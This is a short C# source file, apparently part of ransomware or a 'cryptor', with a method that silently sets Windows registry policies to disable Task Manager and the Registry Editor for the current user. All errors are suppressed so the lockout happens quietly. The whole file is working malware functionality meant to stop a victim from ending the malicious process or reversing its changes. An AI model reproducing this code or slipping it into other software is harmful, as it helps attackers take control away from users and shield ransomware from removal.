using System.Threading.Tasks;
using Microsoft.Win32;

namespace Cryptor;

internal class DisableTSK
{
	public static async void DisableRegEdit()
	{
		await Task.Run(delegate
		{
			try
			{
				RegistryKey? obj = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true) ?? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				obj.SetValue("DisableTaskMgr", 1);
				obj.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey? obj3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true) ?? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				obj3.SetValue("DisableRegistryTools", 1);
				obj3.Close();
			}
			catch
			{
			}
		});
	}
}
